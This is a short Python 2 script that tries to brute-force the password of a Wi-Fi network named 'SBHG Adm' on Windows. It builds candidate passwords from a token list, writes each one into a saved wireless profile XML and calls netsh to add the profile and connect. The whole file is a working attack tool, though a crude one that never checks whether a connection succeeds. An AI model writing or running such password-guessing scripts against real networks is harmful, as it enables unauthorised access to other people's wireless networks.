from subprocess import check_output
from itertools import chain, product
import os

BruteforcePossibilities = ["SBHG","Adm","9000","Reep","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","1","2","3"]
xmlfile = open("D:\Wi-Fi-telenet-6101F.xml")

def Changepassword(password):
    with open('D:\Wi-Fi-telenet-6101F.xml', 'r') as input_file, open('D:\Wi-Fi-telenet-6101Fnew.xml', 'w') as output_file:
        for line in input_file:
            if 'keyMaterial' in line:
                output_file.write('				<keyMaterial>'+str(password)+'</keyMaterial>\n')
            else:
                output_file.write(line)


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

a = bruteforce(BruteforcePossibilities, 8)

allah = 0
for password in a:
    if len(password) > 8:
        Changepassword(password)
        os.popen('netsh wlan add profile filename="D:\Wi-Fi-telenet-6101Fnew.xml"')
        try:
            os.popen('netsh wlan connect "SBHG Adm"')
        except KeyboardInterrupt:
            print "stoppiung"
        else:
            print "nope"